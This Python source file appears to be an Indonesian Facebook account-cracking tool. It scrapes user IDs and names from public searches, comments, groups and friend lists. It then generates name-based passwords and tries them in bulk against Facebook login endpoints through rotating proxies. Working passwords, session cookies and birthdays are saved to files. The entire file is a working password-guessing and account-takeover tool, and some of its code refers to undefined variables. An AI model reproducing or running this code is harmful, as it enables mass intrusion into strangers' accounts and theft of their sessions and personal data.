	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f' [{hh}<{P}] 1 nama setara dengan 10k akun')
	nam = input(f' nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] gagal dump komen')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
	
###---[ DUMP LOGIN ]---###
def crack_publik(t,c):
	akun = input(f'{B}[{M}#{H}]  PUT PUBLIC ID \n{B}[{M}#{H}] INPUT ID :{H} ')
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\rdumping IDs %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"{M}€ {K}this account is private")	


def crack_masal(t,c):
    print(f' {K}# LET THE ID BE PUBLIC  ')
    try:
        bz=0
        apa = int(input(f'{K}#TOTAL ID : {B}'))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r√√√√ID : {H}')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print(f'\r{U}[{H}•{U}] {H}Dumping IDs %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r {M}This account is private{U}      ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f' [{hh}<{P}] pastikan akun bersifat publik \n akun : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] akun tidak publik")
		
def crack_group():
	link = input(f' [{hh}<{P}] pastikan group bersifat publik \n id group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] gagal dump group')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(f"\r{G}============================================")
	ro = input(f'{hh}1{H} MOBILE FACEBOOK (USE) \n{hh}2 {H}MBASIC FACEBOOK \n{M}3 {M}FREE FACEBOOK (NOT WORKING) \n{H} CHOOSE :{H} ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	else:metode.append('mobile')
	print(f"{G}=============================================")
	ch = input(f'\n{G}1 OLD \n{H}2 NEW \n{O}3 RANDOM \n {M} CHOOSE :{H} ')
	if ch in ['1','O']:
		for x in dump:
			id.append(x)
	elif ch in ['2','N']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['3','R']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	
	print(f"{G}=============================================")
	
	
	ch = input(f'{hh}1{B} MANUAL PASSWORD\n{hh}2{B} COMBINED PASSWORD\n{hh}3{B} NORMAL PASSWORD\n{H}#{K} CHOOSE : {G}')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{hh}────────────────────────────────────")
	B = input(f'{U}[{hh}•{U}] input 6 word manual password \n passwor[•]   : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{hh}────────────────────────────────────")
	print(f'{U}[{H}•{U}]{H} OK RESULT STORED IN : {sim_ok}\n{U}[{H}•{U}]{kk}CP RESULT STORED IN : {sim_cp}{hh}')
	print(f"{hh}────────────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r{U} [{hh}•{U}]{U}crack has been completed,\n{U}[{H}•{U}]{H} number of OKs :{ok}\n{U}[{H}•{U}]{kk} number of CPs :{cp}{U} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"{h}────────────────────────────────────")
	B = input(f'{U}[{hh}•{U}] 6 words manual password input\n[•] Password  : ').split(',')
	C = input(f'{U}[{hh}•{U}] input last name password\n[•] Password  : ')
	if ',' in str(C):
		exit(f"{U}[{H}•{U}] one-word back password only")
	print(f"{G}────────────────────────────────────")
	print(f'{U}[{H}•{U}] {H}OK RESULT STORED IN : {sim_ok}\n{U}[{H}•{U}] {kk}CP RESULT STORED IN : {sim_cp}')
	print(f"{G}────────────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"1")
					pwx.append(depan+"12")
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					pwx.append("123456")
					pwx.append(depan+"2002")
					pwx.append(depan+"2017")
					pwx.append(depan+"2018")
					pwx.append(depan+"2019")
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"@#")
					pwx.append(depan+"@?")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"1")
							pwx.append(tengah+"12")
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(tengah+"123456")
							pwx.append("123456")
							pwx.append(tengah+"2002")
							pwx.append(tengah+"2017")
							pwx.append(tengah+"2018")
							pwx.append(tengah+"2019")
							pwx.append(tengah+"2020")
							pwx.append(tengah+"2021")
							pwx.append(tengah+"2022")
							pwx.append(tengah+"@")
							pwx.append(tengah+"baby")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"1")
					pwx.append(depan+"12")
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					pwx.append("123456")
					pwx.append(depan+"2002")
					pwx.append(depan+"2017")
					pwx.append(depan+"2018")
					pwx.append(depan+"2019")
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"@")
					pwx.append(depan+"baby")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r{U}[{hh}•{U}] crack has been completed\n{U}[{H}•{U}]{H} TOTAL OK:{ok}\n{U}[{H}•{U}] {kk}TOTAL CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"{G}============================================√")
	print(f'{G}[{B}*{G}]{H} OK SAVED IN : {sim_ok}\n{G}[{B}*{G}]{K} CP SAVED IN : {sim_cp}')
	print(f"{G}==============≠=============================√")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"1")
					pwx.append(depan+"2")
					pwx.append(depan+"12")
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"@")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"1")
							pwx.append(tengah+"2")
							pwx.append(tengah+"12")
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(tengah+"123456")
							pwx.append(tengah+"2020")
							pwx.append(tengah+"2021")
							pwx.append(tengah+"2022")
							pwx.append(tengah+"@")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"1")
								pwx.append(belakang+"2")
								pwx.append(belakang+"12")
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(belakang+"123456")
								pwx.append(belakang+"2020")
								pwx.append(belakang+"2021")
								pwx.append(belakang+"2022")
								pwx.append(belakang+"@")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"1")
					pwx.append(depan+"2")
					pwx.append(depan+"12")
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"@")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
	sleep(5)
	exit(f'\r{U}[{hh}•{U}]{H} TOTAL OK:{ok}\n[•]{Kk} TOTAL CP:{cp} ')
	#os.popen('play-audio data/selesai.mp3')
				

###---[ MENU CRACK ]---###
resok = []
rescp = []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	bo = random.choice([H,G,K,B,Z,M,U])
	xx = open('.proxy.txt','r').read().splitlines()
	ua2 = random.choice(agent)
	ua = random.choice(agent)
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r{bo}KING-BENZ😘{bb}{ahir}🔥 {G}%s/%s {hh}OK:%s {kk}CP:%s{G}"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			proxy = {'http': 'socks4://'+random.choice(xx)}
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2lf951yj%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf181ab0-57b8-41eb-a5fc-a9b60e705691%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2lf951yj%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2lf951yj%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf181ab0-57b8-41eb-a5fc-a9b60e705691%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2lf951yj%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"}
			bx = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=831199814581595&amp;auth_token=64f7712b5cf46421f8a8a07d32782c84&amp;skip_api_login=1&amp;signed_next=1&amp;next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D831199814581595%26redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ftools%252Fexplorer%252Fcallback%26auth_type%3Drerequest%26scope%3Dgaming_profile%252Cpublic_profile%252Cemail%252Cuser_friends%252Cgaming_user_locale%252Cgaming_user_picture%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5a00384-f152-4b6d-a70e-032c058a1736%26tp%3Dunspecified&amp;refsrc=deprecated&amp;app_id=831199814581595&amp;cancel=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&amp;lwv=100',data=dat, headers=hed)

			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}\n{ua}')
				if data in rescp:pass
				else:
					rescp.append(data) 
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r{hh}[•] USER : {kk}{idf}{hh}\n[•] PASS : {kk}{pw}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n{K}[{K}*{K}] USER : {kk}{idf}\n{K}[{K}*{K}] PASS : {kk}{pw}\n{K}[{K}*{K}] UserAgent : {K}{ua}\n')
							#os.popen('play-audio data/cepe.mp3')
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}\n{kuki}\n{ua}')
				print(f'\r{H}[{H}*{H}] USER : {H}{idf}\n{H}[{H}*{H}] PASS : {H}{pw}\n{hh}{kuki}\n{H}[{H}*{H}] UserAgent : {H}{ua}\n')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r{H}[{H}*{H}] USER : {H}{idf}\n{H}[{H}*{H}] PASS : {H}{pw}\n{hh}{kuki}\n{H}[{H}*{H}] UserAgent : {H}{ua}\n')
						#print("\r %s>> %s "%(H,kuki))
						#print("\r  %s*--> %s"%(P,ua))
						#os.popen('play-audio data/woke.mp3')
						print(f'\r{H}[{H}*{H}] USER : {H}{idf}\n{H}[{H}*{H}] PASS : {H}{pw}\n{hh}{kuki}\n{H}[{H}*{H}] UserAgent : {H}{ua}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	
	

###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] {hh}hore akun tap yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{kk}>{P}] akun terpasang auten                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{hh}>{P}] akun tidak checkpoint                       \n [{hh}>{P}] cookie : {cok}'
			else:
				akun += f'\n [{kk}>{P}] terdapat {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n [{M}>{P}] kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
